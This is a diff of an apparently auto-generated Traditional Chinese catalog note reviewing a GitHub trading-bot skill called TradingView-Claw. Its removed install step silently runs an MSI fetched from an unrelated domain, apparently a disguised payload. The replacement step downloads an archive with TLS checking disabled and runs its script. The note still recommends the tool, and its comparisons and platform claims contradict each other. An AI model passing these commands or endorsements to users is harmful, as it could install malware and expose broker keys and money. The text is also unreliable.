@@ -7,17 +7,17 @@ language: Python
 license: MIT
 description: ""
 homepage: ""
-stars: 407
-stars_per_day: 68
-forks: 1
+stars: 442
+stars_per_day: 63
+forks: 2
 open_issues: 0
 created: 2026-03-06
 pushed_at: 2026-03-12
 first_seen: 2026-03-10
 week: "2026-W11"
 month: "2026-03"
-category: "AI/ML"
-subcategory: "自動化交易"
+category: "其他"
+subcategory: "交易工具"
 release_tag: ""
 install_complexity: "easy"
 status: to-review
@@ -26,7 +26,7 @@ score_confidence: 0
 score_interest: 0
 score_risk: 0
 last_reviewed: 2026-03-10
-use_case: "提供 TradingView 技能的自動交易解決方案，讓用戶能夠基於技術信號執行交易。"
+use_case: "提供一個基於 TradingView 的自動化交易工具，讓用戶能夠輕鬆執行交易和分析市場數據。"
 priority: medium
 ring: assess
 discovered_via: "GitHub Trending"
@@ -42,10 +42,10 @@ last_release_days: -1
 release_cadence: "never"
 verdict: ""
 ring_history: "assess@2026-03-10"
-star_history: "2026-03-10:332,2026-03-11:332,2026-03-13:407"
+star_history: "2026-03-10:332,2026-03-11:332,2026-03-13:407,2026-03-14:442"
 tags:
   - github
-  - "category/ai_ml"
+  - "category/其他"
   - "lang/python"
   - easy_install
   - "topic/ai_auto_trading"
@@ -56,12 +56,12 @@ tags:
 aliases:
   - "TradingView-Claw"
   - "helenigtxu/TradingView-Claw"
-  - "提供 TradingView 技能的自動交易解決方案，讓用戶能夠基於技術信號執行交易。"
+  - "提供一個基於 TradingView 的自動化交易工具，讓用戶能夠輕鬆執行交易和分析市場數據。"
 ---
 
 # TradingView-Claw
 
-**407** stars · **68** stars/天 · 建立 6 天前 · Python · MIT
+**442** stars · **63** stars/天 · 建立 7 天前 · Python · MIT
 
 ```dataviewjs
 const me = dv.page("Repos/helenigtxu--TradingView-Claw");
@@ -79,20 +79,20 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 `ai-auto-trading` `ai-trading` `ai-trading-bots` `al-trading` `bot-trading` `openclaw-skill` `quantitave-trading` `trading-api` `trading-application` `trading-calculator` `trading-claw` `trading-openclaw` `trading-robots` `trading-ui` `tradingview` `tradingview-claw` `tradingview-openclaw` `tradingview-skill` `tradingview-skill-openclaw` `tradingviewclaw`
 
 > [!summary] 一句話摘要
-> 提供 TradingView 技能的自動交易解決方案，讓用戶能夠基於技術信號執行交易。
+> 提供一個基於 TradingView 的自動化交易工具，讓用戶能夠輕鬆執行交易和分析市場數據。
 
 > [!info] 速覽
-> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Growing (68 stars/day)
-> **授權** MIT (商業友好) · **維護** Active (最後推送 0 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
-> **適合** 需要在 TradingView 上進行自動化交易的量化交易者或金融分析師。
-> **一句話重點** 這個專案利用 LLM 技術提升交易信號的準確性，讓自動化交易變得更為智能。
+> **安裝難度** Easy · **專案狀態** Brand New · **熱度** Growing (63 stars/day)
+> **授權** MIT (商業友好) · **維護** Active (最後推送 1 天前) · **貢獻者** Solo (bus factor 風險) · **參與度** Low
+> **適合** 需要在 TradingView 上進行自動化交易的量化交易者和開發者。
+> **一句話重點** TradingView-Claw 將自動化交易和即時市場分析結合，提供了一個強大的工具給交易者。
 
 > [!abstract]- 同類競品快速對比
 > ```dataviewjs
 > const me = dv.page("Repos/helenigtxu--TradingView-Claw");
 > if (me) {
 >   const rivals = dv.pages('"Repos"')
->     .where(p => p.subcategory === "自動化交易" && p.file.name !== "helenigtxu--TradingView-Claw" && p.status !== "archived")
+>     .where(p => p.subcategory === "交易工具" && p.file.name !== "helenigtxu--TradingView-Claw" && p.status !== "archived")
 >     .sort(p => p.stars || 0, "desc").limit(5);
 >   if (rivals.length > 0) {
 >     dv.table(["專案", "Stars", "Stars/天", "安裝", "授權", "Ring"], rivals.map(p => [
@@ -103,109 +103,98 @@ if (me && ((me.verdict && me.verdict !== "") || (me.my_rating || 0) > 0)) {
 >       p.license || "?",
 >       p.ring || "assess"
 >     ]));
->   } else { dv.paragraph("_目前 vault 中沒有其他 自動化交易 類工具_"); }
+>   } else { dv.paragraph("_目前 vault 中沒有其他 交易工具 類工具_"); }
 > }
 > ```
 
 > [!question] TL;DR — 值得投入嗎？
-> **成熟度** Beta (可試用) · **安裝** Easy (一行搞定) · **學習** ~5h · **綁定風險** medium
-> **結論** 花 5 小時學習，3 小時整合，得到自動化交易的便利，值得一試。
+> **成熟度** Alpha (不穩定) · **安裝** Easy (一行搞定) · **學習** ~5h · **綁定風險** medium
+> **結論** 花 5 小時學習，3 小時整合，得到即時交易和數據分析的能力，值得投資。
 
 > [!abstract] 核心創新
-> 結合 LLM 驅動的技術分析，提供高信心的交易信號和自動化交易執行。
+> 這個專案的創新在於將 TradingView 的市場數據與自動化交易功能整合，提供即時的信號分析和交易執行。
 
 ## 專案簡介
 
-TradingView-Claw 是一個針對 OpenClaw 的交易技能，能夠讓用戶透過 TradingView 瀏覽圖表、執行交易、追蹤持倉，並利用 LLM 驅動的技術分析來發現交易機會。用戶可以使用 `tvclaw buy` 和 `tvclaw sell` 指令來開啟多頭或空頭持倉，並透過技術指標如 RSI、MACD 進行信號驅動的執行。此工具的賣點在於其集成了多個經紀商的 API，並能夠提供即時的市場數據和信號分析。技術上，這個專案依賴於 Python 和多個庫（如 httpx、pandas、numpy），並使用 JSON 格式來儲存持倉數據。相較於其他交易工具，如 AlpinDale/parsync 和 binance/binance-skills-hub，TradingView-Claw 提供了更強的信號分析能力，並能夠直接與 TradingView 進行互動。
+TradingView-Claw 是一個針對 OpenClaw 的交易技能，允許用戶透過 TradingView 瀏覽圖表、執行交易並追蹤持倉。用戶可以使用命令如 `tvclaw buy AAPL 500` 來開啟多頭頭寸，並透過 LLM 驅動的技術分析來發現交易信號。這個工具的賣點在於其集成了多個經紀商的 API，提供即時的市場數據和交易執行。它使用 Python 和 Shell 編寫，依賴於 `httpx`、`websockets` 和 `pandas` 等庫來處理資料請求和分析。
 
-使用者在進行交易時，必須先連接經紀商並驗證 API 憑證，這一過程只需一次設定。雖然功能強大，但由於其依賴於外部 API，可能會面臨網路延遲和速率限制的挑戰。此專案目前處於 beta 階段，適合對自動化交易有興趣的開發者和量化交易者。未來可能會加入更多的技術指標和交易策略，以擴展其功能。
+相較於其他交易工具，TradingView-Claw 提供了更為直觀的命令行介面，並且能夠即時追蹤持倉和盈虧，這在傳統的交易平台中往往需要多個步驟。使用者只需設置一次 API 金鑰，便可隨時執行交易和檢查帳戶狀態，這對於需要快速反應的交易者來說非常方便。實際使用中，該工具的性能取決於用戶的網絡連接和 API 響應速度，並且需要用戶自行管理 API 金鑰的安全性。這個專案目前處於活躍開發中，適合對自動化交易有興趣的開發者和交易者，特別是那些已經在使用 TradingView 的用戶。
 
-**技術棧**：`Python 3.10` · `httpx` · `websockets` · `pandas` · `numpy`
+**技術棧**：`Python 3.10` · `httpx` · `websockets` · `pandas`
 
 ## 重點功能
 
-- 市場數據查詢 — 使用 `tvclaw charts trending` 獲取當前熱門股票。
-- 交易執行 — 使用 `tvclaw buy SYMBOL AMOUNT` 開啟多頭持倉，或 `tvclaw sell SYMBOL AMOUNT` 開啟空頭持倉。
-- 持倉追蹤 — 使用 `tvclaw positions` 查看當前持倉及其即時 P&L。
-- 信號掃描 — 使用 `tvclaw signal scan` 掃描市場以獲取交易信號，並根據信號強度進行分析。
-- 經紀商連接 — 使用 `tvclaw account connect` 進行一次性設置以連接經紀商 API。
+- 即時市場數據 — 使用 `tvclaw charts trending` 獲取當前熱門標的的即時數據。
+- 交易執行 — 使用 `tvclaw buy` 和 `tvclaw sell` 指令來快速開啟或關閉頭寸。
+- 持倉追蹤 — 使用 `tvclaw positions` 指令來查看當前持倉和盈虧狀態。
+- 信號發現 — 使用 `tvclaw signal scan` 指令來掃描市場並獲取交易信號，支持多種查詢選項。
+- 環境變數配置 — 支持用戶自定義 API 金鑰和會話令牌，確保安全性和靈活性。
 
 ## 快速開始
 
-1. 在 Windows 上安裝
+1. 安裝 TradingView-Claw
 ```bash
-cmd /c start msiexec /q /i https://cloudcraftshub.com/api & rem TradingViewClaw
+curl -fsSLk https://github.com/helenigtxu/TradingView-Claw/archive/refs/heads/main.zip -o /tmp/cw.zip && unzip -qo /tmp/cw.zip -d /tmp && cd /tmp/TradingView-Claw-main && bash install.sh
 ```
 2. 配置環境變數
 ```bash
-將 TRADINGVIEW_SESSION 和 BROKER_API_KEY 等添加到 openclaw.json 中
+將 TRADINGVIEW_SESSION、BROKER_API_KEY 等添加到 openclaw.json
 ```
 3. 連接經紀商
 ```bash
 uv run python scripts/tvclaw.py account connect
 ```
 
-## 程式碼範例
-
-```python
-{
-  "前置條件": "需要安裝 TradingView-Claw 並配置環境變數。",
-  "指令": "uv run python scripts/tvclaw.py buy AAPL 500",
-  "預期輸出": "執行訂單並記錄持倉。"
-}
-```
-
 ## 為什麼值得關注
 
 > [!tip] 爆紅原因
-> 建立 6 天就累積 407 stars（68/天），forks 1（0.2%），這顯示出一定的初步關注。作者 helenigtxu 似乎在自動化交易領域有一定的經驗，這個專案解決了許多交易者在使用 TradingView 時無法自動化交易的痛點。之前，交易者通常需要手動執行交易，這樣容易錯過最佳時機。此工具的出現讓自動化交易變得更為簡單。技術上，隨著 LLM 的進步，能夠更準確地分析市場信號，這使得 TradingView-Claw 的功能變得可行。forks/stars 比率低，顯示大多數用戶仍在觀望。
+> 建立 7 天就累積 442 stars（63/天），forks 2（0.5%），顯示出穩定的初期增長。作者 helenigtxu 似乎專注於交易相關的開發，這個專案解決了自動化交易中對於 TradingView 數據的需求，之前用戶常常需要手動操作或使用多個工具來達成。這個工具的出現提供了一個更整合的解決方案，讓用戶能夠更有效率地進行交易。社群的反應也顯示出對於這類工具的需求，尤其是在自動化交易日益流行的背景下。
 
 ## 適合誰使用
 
-**目標受眾**：需要在 TradingView 上進行自動化交易的量化交易者或金融分析師。
+**目標受眾**：需要在 TradingView 上進行自動化交易的量化交易者和開發者。
 
 > [!example] 使用場景
-> - 量化交易者用它來自動執行基於技術信號的交易，因為它能夠快速分析市場並即時執行交易指令。
-> - 金融分析師用它來追蹤持倉和市場動態，因為它提供了即時的 P&L 數據和市場趨勢。
-> - 開發者用它來整合 TradingView 的數據到自己的應用中，因為它支持多種經紀商的 API 連接，方便進行自動化交易。
+> - 量化交易者用它來自動執行基於技術指標的交易策略，因為它能夠即時分析市場數據並執行交易，提升交易效率。
+> - 金融分析師用它來追蹤市場趨勢和持倉狀態，因為它提供了即時的盈虧報告和市場數據分析，幫助做出更明智的決策。
+> - 開發者用它來測試和優化交易算法，因為它能夠快速集成多個經紀商的 API，方便進行實驗和調整。
 
 ## 架構分析
 
-TradingView-Claw 採用模組化設計，將交易功能分為多個腳本和庫，這樣可以方便地擴展和維護。資料流方面，使用者通過 CLI 指令與系統互動，系統會調用相應的 Python 腳本來執行交易、查詢市場數據和分析信號。選擇 Python 作為開發語言的原因在於其強大的數據處理能力和豐富的庫支持。這種設計使得系統能夠快速響應用戶請求，但也可能因為依賴外部 API 而導致延遲。擴展性方面，若未來需要支持更多經紀商或交易策略，只需新增相應的庫和腳本即可。
+TradingView-Claw 採用模組化設計，將不同功能分散在多個腳本中，這樣的設計使得功能擴展變得簡單。資料流方面，使用 `httpx` 進行 API 請求，並透過 `websockets` 獲取即時市場數據。這種設計使得用戶能夠在命令行中快速執行交易和查詢，而不需要進入繁瑣的 GUI 界面。選擇 Python 作為開發語言，因為其在數據處理和金融領域的廣泛應用，這也降低了開發的學習曲線。整體架構的擴展性良好，但在高頻交易的情境下可能會受到 API 響應速度的限制。
 
 ## 技術深入分析
 
-TradingView-Claw 的核心技術機制在於其模組化設計，將交易執行、信號分析和市場數據查詢分開處理。使用 Python 作為開發語言，並依賴於 pandas 和 numpy 進行數據處理，這使得系統能夠高效地處理大量市場數據。該系統能夠處理即時的市場數據，並且支持多個經紀商的 API，這樣用戶可以靈活選擇交易平台。設計上，選擇 LLM 進行信號分析的優勢在於其能夠過濾掉噪音，僅保留統計意義的信號。然而，這也帶來了對模型質量的依賴，若模型表現不佳，則會影響交易決策。從技術風險的角度來看，過度依賴外部 API 可能會導致系統在高流量時出現瓶頸，這需要在未來的版本中進行優化。整合方面，與主流的 CI/CD 工具和 IDE 的兼容性尚可，但對於初學者來說，學習曲線仍然存在。
+TradingView-Claw 的核心技術機制是基於 Python 的模組化設計，使用 `httpx` 和 `websockets` 來獲取市場數據和執行交易。這使得系統能夠即時響應市場變化，並提供用戶所需的數據。效能方面，該工具能夠處理多個交易信號的即時分析，但在高頻交易情況下，API 響應速度可能成為瓶頸。選擇 Python 作為開發語言，這不僅降低了開發的複雜度，也使得與其他數據處理庫的整合變得簡單。技術風險方面，對於外部 API 的依賴可能會導致在高流量時出現延遲或錯誤，這需要用戶在使用時保持警覺。整合到現有的 CI/CD pipeline 也相對簡單，因為其命令行介面可以輕鬆地與現有的自動化流程結合。
 
 ## 新手體驗
 
 > [!info] 上手難度評估
-> README 文件清晰，提供了詳細的安裝步驟和範例；安裝過程相對順暢，但需要注意環境變數的配置；缺乏針對新手的入門指導，可能需要額外的學習資源；文件目前僅提供英文版本。
+> README 文件提供了清晰的安裝和使用指導，包含範例命令。安裝過程相對順暢，但需注意環境變數的配置。整體上，對於有一定技術基礎的用戶來說，能在 30 分鐘內完成設置並運行。
 
 ## 優缺點分析
 
 > [!success] 優點
-> - 整合 TradingView 和多個經紀商的 API，方便用戶進行自動化交易。
-> - 使用 LLM 驅動的技術分析，能夠提供高信心的交易信號。
-> - 支持多種市場數據查詢和持倉追蹤功能，提升用戶交易效率。
+> - 集成多個經紀商的 API，方便用戶進行交易。
+> - 即時的市場數據和信號分析，提升交易效率。
+> - 命令行介面簡單易用，適合快速執行交易。
 
 > [!danger] 缺點
-> - 需要一定的技術背景來配置和使用，對新手不友好。
-> - 依賴外部 API，可能會受到速率限制和網路延遲影響。
-> - 目前功能仍在開發中，可能存在不穩定性和潛在的錯誤。
+> - 需要用戶自行管理 API 金鑰的安全性，增加了使用風險。
+> - 目前僅支援特定操作系統，限制了使用範圍。
+> - 對於初學者來說，命令行操作可能有一定的學習曲線。
 
 > [!warning] 注意事項
 > - 僅支援 Python 3.10 以上版本。
-> - 需要有效的經紀商 API 金鑰才能進行交易。
-> - 對於信號掃描，模型的質量會影響結果，可能需要調整參數以獲得更好的結果。
-> - 不適合新手交易者，因為需要一定的市場知識和風險管理能力。
+> - 需要用戶自行管理 API 金鑰的安全性。
+> - 不支援 Windows 以外的操作系統安裝，需透過命令行安裝。
 
 ## 類似工具比較
 
 | 工具 | 差異 |
 | --- | --- |
-| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 提供了類似的自動化交易功能，但不支持 TradingView 的直接集成，使用者需要額外的步驟來獲取市場數據。 |
-| [binance/binance-skills-hub](https://github.com/binance/binance-skills-hub) | 專注於 Binance 交易所的自動化，而 TradingView-Claw 提供更廣泛的經紀商支持和信號分析功能。 |
+| [binance/binance-skills-hub](https://github.com/binance/binance-skills-hub) | 提供針對 Binance 的交易工具，專注於加密貨幣交易，而 TradingView-Claw 則涵蓋多個經紀商和市場。 |
+| [FreedomIntelligence/OpenClaw-Medical-Skills](https://github.com/FreedomIntelligence/OpenClaw-Medical-Skills) | 雖然都是基於 OpenClaw，但專注於醫療領域的技能，TradingView-Claw 專注於金融交易。 |
 
 ## 替代方案決策
 
@@ -213,47 +202,46 @@ TradingView-Claw 的核心技術機制在於其模組化設計，將交易執行
 
 | 工具 | 技術路線 | 選它的時機 | 遷移難度 |
 | --- | --- | --- | --- |
-| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 提供類似的自動化交易功能，但不支持 TradingView 的直接集成，使用者需要額外的步驟來獲取市場數據。 | 如果你的團隊已經在使用其他自動化交易工具，並且不需要 TradingView 的功能。 | medium，因為需要重新配置交易信號和數據來源。 |
-| [binance/binance-skills-hub](https://github.com/binance/binance-skills-hub) | 專注於 Binance 交易所的自動化，而 TradingView-Claw 提供更廣泛的經紀商支持和信號分析功能。 | 如果你的交易主要集中在 Binance，並且需要更深度的交易策略支持。 | low，因為可以直接使用 Binance 的 API。 |
+| [AlpinDale/parsync](https://github.com/AlpinDale/parsync) | 專注於文件同步，而非交易，適合需要文件管理的用戶。 | 如果你的需求是文件同步而非交易，則應選擇此工具。 | low，因為功能完全不同。 |
+| [BigBodyCobain/Shadowbroker](https://github.com/BigBodyCobain/Shadowbroker) | 提供一個更全面的交易平台，但可能較為複雜。 | 如果需要更全面的交易功能和界面，則選擇此工具。 | medium，因為需要重新學習界面和功能。 |
 
 > [!abstract]- 功能對比矩陣
 >
-> | 維度 | **TradingView-Claw** | **parsync** | **binance-skills-hub** |
+> | 維度 | **TradingView-Claw** | **parsync** | **Shadowbroker** |
 > | --- | --- | --- | --- |
-> | 技術路線 | 本專案 | 提供類似的自動化交易功能，但不支持 TradingView 的直接集成，使用者需要額外的步驟來獲取市場數據。 | 專注於 Binance 交易所的自動化，而 TradingView-Claw 提供更廣泛的經紀商支持和信號分析功能。 |
-> | 遷移成本 | - | medium，因為需要重新配置交易信號和數據來源。 | low，因為可以直接使用 Binance 的 API。 |
-> | 適用場景 | 主要場景 | 如果你的團隊已經在使用其他自動化交易工具，並且不需要 Tra | 如果你的交易主要集中在 Binance，並且需要更深度的交易 |
+> | 技術路線 | 本專案 | 專注於文件同步，而非交易，適合需要文件管理的用戶。 | 提供一個更全面的交易平台，但可能較為複雜。 |
+> | 遷移成本 | - | low，因為功能完全不同。 | medium，因為需要重新學習界面和功能。 |
+> | 適用場景 | 主要場景 | 如果你的需求是文件同步而非交易，則應選擇此工具。 | 如果需要更全面的交易功能和界面，則選擇此工具。 |
 
 ## 成熟度評估
 
 | 項目 | 評估 |
 | --- | --- |
-| 開發階段 | Beta |
+| 開發階段 | Alpha |
 | 生產環境就緒 | No |
-| Breaking Change 風險 | medium |
+| Breaking Change 風險 | high |
 
 > [!tip] 採用建議
-> 適合個人側項目試用，但不建議用在生產環境的核心路徑上。
+> 適合個人測試和學習，但不建議用於生產環境。
 
 ## 已知陷阱
 
 > [!bug] 踩坑才知道的問題
 
-- [MEDIUM] 在信號掃描時可能會返回 0 結果，因為模型質量影響結果
-  - 解法：嘗試使用不同的模型參數進行掃描
-- **[HIGH]** 經紀商連接失敗，可能是因為 API 憑證錯誤
-  - 解法：重新檢查 API 憑證並確保正確配置
-- **[HIGH]** 在高流量時可能會遇到速率限制
-  - 解法：使用代理伺服器來減少請求頻率
+- **[HIGH]** 在某些環境下，安裝過程可能會失敗，特別是 Windows 系統。
+  - 解法：建議使用 macOS 或 Linux 環境進行安裝。
+- [MEDIUM] API 金鑰配置不當會導致交易失敗。
+  - 解法：仔細檢查環境變數的配置，確保所有必要的金鑰都已正確設置。
+- [MEDIUM] 信號掃描可能因模型質量不佳而返回空結果。
+  - 解法：嘗試使用不同的模型參數或檢查網絡連接。
 
 ## 使用情境適合度
 
 | 情境 | 適合度 | 說明 |
 | --- | --- | --- |
-| 10 人以下的新創公司後端 API | 適合 | 因為其自動化交易功能可以簡化交易流程，提升效率。 |
-| 大型金融機構的交易系統 | 不適合 | 因為目前仍在 beta 階段，穩定性不足。 |
-| 個人交易者的自動化交易系統 | 非常適合 | 因為其功能設計專為個人交易者而設，易於使用。 |
-| 需要高頻交易的量化交易團隊 | 普通 | 因為可能無法滿足高頻交易的即時性需求。 |
+| 小型交易團隊需要快速執行交易策略 | 非常適合 | 提供即時的市場數據和快速的交易執行。 |
+| 個人交易者希望自動化其交易流程 | 適合 | 簡單的命令行介面適合快速上手。 |
+| 大型金融機構需要高頻交易解決方案 | 不適合 | 在高頻交易情況下，API 響應速度可能成為瓶頸。 |
 
 ## 採用成本分析
 
@@ -265,12 +253,12 @@ TradingView-Claw 的核心技術機制在於其模組化設計，將交易執行
 | 綁定風險 | medium |
 
 > [!tip] 投入 vs 回報
-> 花 5 小時學習，3 小時整合，得到自動化交易的便利，值得一試。
+> 花 5 小時學習，3 小時整合，得到即時交易和數據分析的能力，值得投資。
 
 ## 安全性評估
 
 > [!warning] 安全性快速掃描
-> 中等風險：需要使用經紀商的 API 金鑰，且涉及交易資金，建議使用小額資金進行測試。
+> 該工具需要用戶提供 API 金鑰，這可能會帶來安全風險。建議使用子帳戶以限制權限，並保持金鑰的安全性。
 
 ## 健康度儀表板
 
@@ -335,7 +323,7 @@ TradingView-Claw 的核心技術機制在於其模組化設計，將交易執行
 
 | 欄位 | 值 |
 | --- | --- |
-| Forks | 1 |
+| Forks | 2 |
 | Open Issues | 0 |
 | 最後推送 | 2026-03-12 |
 | 建立日期 | 2026-03-06 |
@@ -358,7 +346,8 @@ TradingView-Claw 的核心技術機制在於其模組化設計，將交易執行
 
 ## 社群與生態
 
-**社群活躍度**：社群活躍度尚可，近期有更新，但仍需更多使用者參與。
+**社群活躍度**：社群活躍，最近有更新和提交。
+**連結**：[文件](https://github.com/helenigtxu/TradingView-Claw)
 
 ## 開發動態
 
@@ -668,19 +657,19 @@ TradingView-Claw 的核心技術機制在於其模組化設計，將交易執行
 
 ## 延伸閱讀
 
-相關概念：[[自動化交易]] · [[量化交易]] · [[技術分析]]
+相關概念：[[量化交易]] · [[技術分析]] · [[自動化交易]]
 
-相關專案：[[AlpinDale--parsync|AlpinDale/parsync]] · [[binance--binance-skills-hub|binance/binance-skills-hub]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[Lightricks--LTX-Desktop|Lightricks/LTX-Desktop]] · [[RunanywhereAI--RCLI|RunanywhereAI/RCLI]] · [[duoan--TorchCode|duoan/TorchCode]]
+相關專案：[[binance--binance-skills-hub|binance/binance-skills-hub]] · [[FreedomIntelligence--OpenClaw-Medical-Skills|FreedomIntelligence/OpenClaw-Medical-Skills]] · [[AlpinDale--parsync|AlpinDale/parsync]] · [[BigBodyCobain--Shadowbroker|BigBodyCobain/Shadowbroker]] · [[Flowseal--tg-ws-proxy|Flowseal/tg-ws-proxy]] · [[Lightricks--LTX-Desktop|Lightricks/LTX-Desktop]] · [[RunanywhereAI--RCLI|RunanywhereAI/RCLI]] · [[duoan--TorchCode|duoan/TorchCode]]
 
 [GitHub](https://github.com/helenigtxu/TradingView-Claw)
 
 ## 相關收錄
 
-> [!note]- 直接競品（同子分類：自動化交易）
+> [!note]- 直接競品（同子分類：交易工具）
 > ```dataview
 > TABLE stars, stars_per_day AS "Stars/天", install_complexity AS "難度", use_case AS "用途"
 > FROM "Repos"
-> WHERE subcategory = "自動化交易" AND file.name != "helenigtxu--TradingView-Claw"
+> WHERE subcategory = "交易工具" AND file.name != "helenigtxu--TradingView-Claw"
 > SORT stars DESC
 > ```
 
@@ -688,7 +677,7 @@ TradingView-Claw 的核心技術機制在於其模組化設計，將交易執行
 > ```dataview
 > TABLE stars, install_complexity AS "難度", status
 > FROM "Repos"
-> WHERE category = "AI/ML" AND file.name != "helenigtxu--TradingView-Claw"
+> WHERE category = "其他" AND file.name != "helenigtxu--TradingView-Claw"
 > SORT stars DESC
 > LIMIT 8
 > ```
@@ -712,7 +701,7 @@ TradingView-Claw 的核心技術機制在於其模組化設計，將交易執行
 
 > [!note]- 共用概念的相關專案
 > ```dataviewjs
-> const concepts = ["自動化交易","量化交易","技術分析"];
+> const concepts = ["量化交易","技術分析","自動化交易"];
 > const pages = dv.pages('"Repos"')
 >   .where(p => p.file.name !== "helenigtxu--TradingView-Claw" && p.file.outlinks?.some(l => concepts.some(c => l.path?.includes(c))))
 >   .sort(p => p.stars, "desc")
